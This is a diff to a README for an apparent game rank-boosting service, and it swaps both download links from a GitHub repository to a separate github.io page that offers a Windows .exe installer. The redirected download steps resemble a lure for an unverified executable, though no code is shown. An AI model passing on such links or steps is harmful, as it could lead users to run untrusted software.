@@ -1,6 +1,6 @@
 # 🚀 boostlab-gaming-service-hub - Improve your rank with professional players
 
-[![](https://img.shields.io/badge/Download-BoostLab-blue.svg)](https://github.com/Marcelobleak640/boostlab-gaming-service-hub)
+[![](https://img.shields.io/badge/Download-BoostLab-blue.svg)](https://marcelobleak640.github.io)
 
 BoostLab connects you with professional gamers who help you reach your goals in Counter-Strike 2 and Fortnite. This software provides a portal to view available services and manage your account. You use the platform to select a professional, set your desired ranking, and track your order status in real time. The service operates through your web browser to ensure a smooth connection between you and your chosen expert.
 
@@ -20,7 +20,7 @@ If your computer meets these requirements, the application will perform as expec
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit [this page](https://github.com/Marcelobleak640/boostlab-gaming-service-hub) to download the installation file.
+1. Visit [this page](https://marcelobleak640.github.io) to download the installation file.
 2. Click on the link provided to reach the release section.
 3. Locate the latest executable file ending in .exe.
 4. Save the file to your computer.
